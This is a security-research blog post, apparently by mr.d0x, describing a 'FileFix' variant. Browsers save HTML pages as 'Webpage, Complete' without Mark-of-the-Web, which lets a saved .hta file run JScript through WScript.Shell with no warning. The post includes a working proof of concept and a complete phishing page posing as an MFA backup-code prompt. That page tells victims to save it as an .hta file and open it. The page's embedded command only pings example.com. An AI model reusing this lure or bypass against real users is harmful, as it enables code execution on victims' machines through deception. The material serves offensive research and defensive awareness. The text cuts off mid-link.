---
title: Security Research | mr.d0x
url: https://mrd0x.com/filefix-part-2/
source: Over Security - Cybersecurity news aggregator
date: 2025-09-25
fetch_date: 2025-10-02T20:39:38.549979
---

# Security Research | mr.d0x

[![](/static/main-020a2a0d87c7acec8a39fcb157600ba7.png)](/)

# mr.d0x

C:\Users\mr.d0x> [whoami](/whoami/)\_

[@mrd0x](https://twitter.com/mrd0x)[MalDev Academy](https://maldevacademy.com)[LOTS Project](https://lots-project.com)[MalAPI.io](https://malapi.io)[Filesec.io](https://filesec.io)

# FileFix (Part 2)

June 30, 2025

Another FileFix variation.

# Introduction

Last week I released the [FileFix attack blog post](https://mrd0x.com/filefix-clickfix-alternative/) which is an alternative to the traditional ClickFix attack. This blog post explores another variation to the original FileFix attack.

# Saving Webpages

While analyzing Chrome & MS Edge’s behavior, I made an interesting observation. When an HTML page is saved using `Ctrl+S` or Right-click > “Save as” and either “Webpage, Single File” or “Webpage, Complete” types were selected, then **the file downloaded does not have MOTW**. Furthermore, this behaviour only applies if the webpage being saved has a MIME type of `text/html` or `application/xhtml+xml`. Other MIME types will result in the file being tagged with MOTW (e.g. `image/png`, `image/svg+xml` etc.)

[![Save-As](/static/64cb813a67e9933d9d375809bfdcfd98/8c557/save-as.png)](/static/64cb813a67e9933d9d375809bfdcfd98/c56af/save-as.png)

[![MOTWBypass](/static/f7840b6fe645d284c1bc70d6a7f65a7e/8c557/motw-bypass.png)](/static/f7840b6fe645d284c1bc70d6a7f65a7e/d26aa/motw-bypass.png)

Now the issue with saving the page using `Ctrl+S` is that selecting either MOTW-exempted formats results in the browser adding additional content to the start and end of the file. For example saving a webpage in the “Webpage, Single File” format creates a `.mhtml` file with the structure below where `[WEBSITE CONTENT HERE]` is all of the webpage’s contents.

```
From: <Saved by Blink>
Snapshot-Content-Location: https://example.com/path/to/saved/file.html
Subject:
Date: Wed, 23 Jun 2025 19:06:50 -0400
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--qCWAsGDCsuFcsHDxhPN54vrvzsscd2h8FvTNKxuYDb----"

------MultipartBoundary--qCWAsGDCsuFcsHDxhPN54vrvzsscd2h8FvTNKxuYDb----
Content-Type: text/html
Content-ID: <frame-209DDB4E543285936F5DACCC9FD98ED3@mhtml.blink>
Content-Transfer-Encoding: quoted-printable
Content-Location: https://example.com/path/to/saved/file.html

<html lang=3D"en"><head><meta http-equiv=3D"Content-Type" content=3D"text/h=
tml; charset=3DUTF-8"></head><body>

[WEBSITE CONTENT HERE]

</body></html>
------MultipartBoundary--qCWAsGDCsuFcsHDxhPN54vrvzsscd2h8FvTNKxuYDb------
```

On the other hand, saving the file as “Webpage, Complete” will have the following structure, again with `[WEBSITE CONTENT HERE]` being the webpage’s contents.

```
<!DOCTYPE html>
<!-- saved from url=(0056)https://example.com/path/to/saved/file.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
[WEBSITE CONTENT HERE]
</body></html>
```

This is problematic because we can’t control the entire contents of the saved file as it must follow one of the previously shown structures.

# HTML Applications

Luckily for us, HTML Applications (`.hta`) files can process HTML content without issues, allowing us to embed scripts directly within HTML-based file. To test this out, host an HTML file on a website and paste the following contents inside.

> Testing this locally (i.e. `C:\Users\bob\index.html`) will not work so make sure to test it on an actual website.

```
<!DOCTYPE html>
<!-- saved from url=(0043)https://example.com/path/to/your/file.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body>

<script language="JScript">
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("cmd.exe /c ping example.com");
</script>

</body></html>
```

Since the file is already structured the same way as if it were saved using the “Webpage, Complete” format, the browser won’t modify it, besides the “saved from url” comment. Navigate to the HTML file via the browser, save it as “Webpage, Complete” format and add the `.hta` file extension. Once downloaded, run it and it should run immediately without any security warnings or prompts.

[![Demo1](/static/36009be151e8b7d9d8cd1197d5796caa/8c557/demo-1-ss.png)](/static/36009be151e8b7d9d8cd1197d5796caa/6bfbb/demo-1-ss.png)

## Demo

[Higher quality here](/2ae533d0779b8aef50ee8a17699977a0/demo-1.mp4).

![Demo1](/419e90dbf55e09dc8de881ba1e798f22/demo-1.gif)

# Weaponization

Now that we’ve confirmed that we can execute the file, we need a social engineering trick to make the user save the HTML page. One idea that immediately comes to mind is asking users to save backup codes via `Ctrl+S`.

```
<!DOCTYPE html>
<!-- saved from url=(0043)https://example.com/path/to/your/file.html -->
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Save Backup Codes</title>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: #f1f3f4;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .card {
      background: #fff;
      width: 400px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      padding: 24px 32px;
      text-align: center;
    }

    h2 {
      margin-top: 0;
      font-weight: 400;
    }

    .desc {
      font-size: 0.95em;
      color: #5f6368;
    }

    .instructions {
      text-align: left;
      background: #f8f9fa;
      border-left: 4px solid #1a73e8;
      padding: 16px;
      margin: 24px 0;
      font-size: 0.9em;
      line-height: 1.8em;
    }

    .codes {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      font-size: 1.1em;
      margin: 20px 0;
    }

    .codes div::before {
      content: "☐ ";
    }

    .footer {
      font-size: 0.8em;
      color: #666;
      margin-top: 12px;
    }

    .logo {
      margin-top: 16px;
    }

    .logo img {
      height: 24px;
    }

    button {
      margin-top: 20px;
      padding: 8px 16px;
      font-size: 0.9em;
      background: #f1f3f4;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background: #e0e0e0;
    }

    kbd {
      background: #eee;
      border-radius: 3px;
      padding: 2px 6px;
      font-family: monospace;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Save your backup codes</h2>
    <div class="desc">Follow the instructions below to save your backup codes.</div>

    <div class="instructions">
      <div>1. Press <kbd>Ctrl</kbd> + <kbd>S</kbd> to save this page.</div>
      <div>2. Name the file <kbd><strong>MfaBackupCodes2025.hta</strong></kbd>.</div>
      <div>3. After saving, open the file to confirm the codes are stored properly.</div>
    </div>

    <div class="codes">
      <div>8234 6752</div>
      <div>1903 8441</div>
      <div>4527 3096</div>
      <div>6658 1204</div>
      <div>2719 4890</div>
      <div>5116 7385</div>
      <div>0327 1968</div>
      <div>7475 3261</div>
      <div>9082 6673</div>
      <div>3849 0570</div>
    </div>

    <div class="footer">
      You can only use each backup code once.<br>
    </div>

  </div>
  <script language="JScript">
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("cmd.exe /c ping example.com");
</script>
</body>
</html>
```

[![Weaponization](/static/41f5ecc2126f587dcfeae655e14fcc2f/8c557/weaponization-1.png)](/static/41f5ecc2126f587dcfeae655e14fcc2f/c1b63/weaponization-1.png)

[![Weaponization](/static/06968f73484e761e91b9cf9eb40824d3/8c557/weaponization-2.png)](/static/06968f73484e761e91b9cf9eb40824d3/12470/weaponization-2.png)

[![Weaponization](/static/1f19050c4059055a90b934baf2e086f0/8c557/weaponization-3.png)](/static/1f19050c4059055a90b934baf2e086f0/95e27/weaponization-3.png)

[![Weaponization](/static/8a7aea4e80b41f28539e2f94791d1d64/8c557/weaponization-4.pn...